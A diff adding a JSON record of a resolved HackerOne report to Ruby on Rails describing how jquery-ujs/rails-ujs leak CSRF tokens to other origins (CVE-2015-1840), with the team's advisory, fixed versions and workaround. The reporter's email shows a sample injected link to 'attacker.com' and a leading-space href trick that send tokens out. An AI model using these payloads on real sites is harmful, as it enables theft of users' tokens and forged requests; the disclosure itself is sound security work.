@@ -1,0 +1,125 @@
+{
+  "id": 49935,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTkzNQ==",
+  "url": "https://hackerone.com/reports/49935",
+  "title": "rails-ujs will send CSRF tokens to other origins",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-03-03T18:42:54.912Z",
+  "submitted_at": "2015-03-03T18:42:54.912Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mastahyeti",
+    "url": "/mastahyeti",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2015-06-16T19:21:31.440Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-06-16T19:21:31.180Z",
+  "team_member_agreed_on_going_public_at": "2015-06-16T19:20:31.532Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I reported this via email a few months ago. Here was my initial email:\r\n\r\n> Hello,\r\n> I've been playing with getting Rails apps to send CSRF tokens to the wrong domains and I found a few problems. The main motivation for this is in attacking a site that uses Content Security Policy. With CSP enabled, an attacker with an XSS vulnerability cannot simply inject inline JavaScript, but they can still abuse some Rails features to steal a CSRF token.\r\n> \r\n> In the scenario where an attacker can inject arbitrary HTML into the response, the simplest attack would be to inject:\r\n> \r\n> <a href=\"https://attacker.com\" data-remote data-method=\"post\" data-cross-domain=\"false\">\r\n> \r\n> Clicking on this link will trigger an OPTIONS request to attacker.com. If the attacker returns the correct CORS headers, a POST request containing the user's CSRF token will be sent to attacker.com.\r\n> \r\n> In a second scenario, an attacker might be able to control only the href attribute of an anchor tag or the action attribute of a form tag that will trigger a data-remote action. This isn't uncommon to see if the site is building anchor or form tags dynamically. In this case, the attacker can set the href or action to \" https://attacker.com\". This will be passed to JQuery, who will see this as a same origin request.\r\n> \r\n> The JQuery behavior can be found here and a similar bug in Zepto can be found here. In both these cases, weak regexes don't match the URL and the framework fails open into assuming that the URL is same origin. Prefixing the URL with a space character is one way to break this regex, but the regexes are pretty weak and there are probably other ways as well.\r\n> \r\n> I'll contact the JQuery/Zepto folks about fixing their regexes, but there are a few thing that could improve this in jquery_ujs as well.\r\n> \r\n> I don't think a data attribute (data-cross-domain) should be able to force jquery_ujs to send the CSRF token.\r\n> The href attribute should be accessed directly here rather than calling attr(\"href\"). When called directly, the browser does a lot to clean up the URL and make sure that it is well formed. This would address the space prefix issue.\r\n> Some stronger protections could be added before calling CSRFProtection here.\r\n> For links with data-method, but without data-remote, the origin isn't even checked before adding a CSRF token to the form. This could even be exploited accidentally. Origin checking should be added here\r\n> \r\n> I haven't seen a bulletproof way for comparing origins yet, but I've got a few ideas if you want to discuss it more. Let me know what you think.\r\n> \r\n> Thanks,\r\n> Ben Toews\r\n> GitHub Security",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2015-07-16T19:20:31.802Z",
+  "allow_singular_disclosure_after": -270749795.29584867,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "cryptographer",
+    "shivammusic"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 167,
+      "category": "team",
+      "content": "CSRF Vulnerability in jquery-ujs and jquery-rails \n\nThere is an vulnerability in jquery-ujs and jquery-rails that can be used to \nbypass CSP protections and allows attackers to send CSRF tokens to attacker domains. \n\nThis vulnerability has been assigned the CVE identifier CVE-2015-1840. \n\nVersions Affected:  All. \nNot affected:       Applications which don't use jquery-ujs or jquery-rails. \nFixed Versions:     jquery-rails versions 4.0.4 and 3.1.3 and jquery-ujs 1.0.4. \n\nImpact \n------ \nIn the scenario where an attacker might be able to control the href attribute of an anchor tag or \nthe action attribute of a form tag that will trigger a POST action, the attacker can set the \nhref or action to \" https://attacker.com\" (note the leading space) that will be passed to JQuery, \nwho will see this as a same origin request, and send the user's CSRF token to the attacker domain. \n\nReleases \n-------- \nThe FIXED releases are available at the normal locations. \n\nWorkarounds \n----------- \nTo work around this problem, change code that allows users to control the href attribute of an anchor \ntag or the action attribute of a form tag to filter the user parameters. \n\nFor example, code like this: \n\n    link_to params \n\nto code like this: \n\n    link_to filtered_params \n\n    def filtered_params \n      # Filter just the parameters that you trust \n    end \n\nPatches \n------- \nTo aid users who aren't able to upgrade immediately we have provided patches for the \nsupported release series. They are in git-am format and consist of a single changeset. \n\n* 1-0-3-jquery_ujs_csrf.patch - Patch for jquery-ujs 1.0.3. \n* 3-1-2-jquery-rails-csrf.patch - Patch for jquery-rails 3.1.2. \n* 4-0-3-jquery-rails-csrf.patch - Patch for jquery-rails 4.0.3. \n\nCredits \n------- \n\nThanks to Ben Toews of GitHub for reporting the vulnerability to us, and working with us on a fix. ",
+      "user": {
+        "id": 20,
+        "username": "arice",
+        "name": "Alex Rice",
+        "bio": "hackerone | internet bug bounty",
+        "cleared": false,
+        "verified": false,
+        "website": "https://twitter.com/senorarroz",
+        "location": "",
+        "created_at": "2013-06-18T19:55:34.230Z",
+        "url": "https://hackerone.com/arice",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/d7b0d969b6320751e1c58b9e3efff1e228054ee3d8eade5c51c4c79b25513a9c"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
